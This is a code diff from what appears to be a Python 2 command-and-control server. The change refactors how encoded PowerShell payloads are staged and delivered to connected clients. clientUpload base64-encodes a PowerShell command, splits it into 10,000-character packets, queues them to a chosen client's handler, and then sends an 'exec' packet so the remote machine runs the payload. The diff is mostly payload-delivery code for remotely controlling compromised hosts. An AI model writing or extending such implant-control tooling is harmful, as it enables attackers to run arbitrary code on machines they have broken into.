@@ -66,11 +66,36 @@ def interactShell(clientnumber):
                         time.sleep(0.01)
                     print server.handlers[clientnumber].in_buffer.pop()
 
-
     return "clear"
 
 def returnServerList():
     return serverlist
+
+def checkPayloadLength(payload):
+    maxlen = 10000
+    splitPayload = []
+    payloadLen = len(payload)
+
+    if payloadLen > maxlen:
+        current_length = 0
+        numberOfPackets = int(payloadLen / maxlen)
+        if payloadLen % maxlen != 0:
+            numberOfPackets += 1
+        print "number of staged packets: " + str(numberOfPackets)
+
+        while current_length < payloadLen:
+            cutlength = maxlen
+            if payloadLen < current_length + maxlen:
+                cutlength = payloadLen - current_length
+
+            tmp_str = payload[current_length:current_length + cutlength]
+            current_length += maxlen
+            splitPayload.append(tmp_str)
+    else:
+        splitPayload = None
+
+    return splitPayload
+
 
 def clientUpload(fileToUpload,clientnumber,powershellExec,isExe):
     from menu import clientMenuOptions
@@ -84,25 +109,14 @@ def clientUpload(fileToUpload,clientnumber,powershellExec,isExe):
         b64Exec = base64.b64encode(fullExec.encode('UTF-16LE'))
         lenb64 = len(b64Exec)
 
-        maxlen = 10000
-        if lenb64 > maxlen:
-            current_length = 0
-            numberOfPackets = int(lenb64 / maxlen)
-            if lenb64 % maxlen != 0:
-                numberOfPackets += 1
-            print "number of staged packets: " + str(numberOfPackets)
+        splitPayoad = checkPayloadLength(b64Exec)
 
-            while current_length < lenb64:
-                cutlength = maxlen
-                if lenb64 < current_length + maxlen:
-                    cutlength = lenb64 - current_length
-
-                tmp_str = b64Exec[current_length:current_length + cutlength]
-                current_length += maxlen
-                time.sleep(0.5)
+        if splitPayoad:
+            for p in splitPayoad:
                 for server in serverlist:
                     if clientnumber in server.handlers.keys():
-                        server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}'% (tmp_str))
+                        server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}' % (p))
+                        time.sleep(0.5)
             print "sending exec packet!"
             time.sleep(0.5)
             for server in serverlist:
@@ -110,7 +124,7 @@ def clientUpload(fileToUpload,clientnumber,powershellExec,isExe):
                     server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"", "sendoutput":"false", "multiple":"exec"}')
 
         else:
-            powershellExec = '{"type":"", "data":"%s", "sendoutput":"false", "multiple":""}'% (base64.b64encode(fullExec.encode('utf_16_le')))
+            powershellExec = '{"type":"", "data":"%s", "sendoutput":"false", "multiple":""}' % (b64Exec)
     else:
         for server in serverlist:
             if clientnumber in server.handlers.keys():
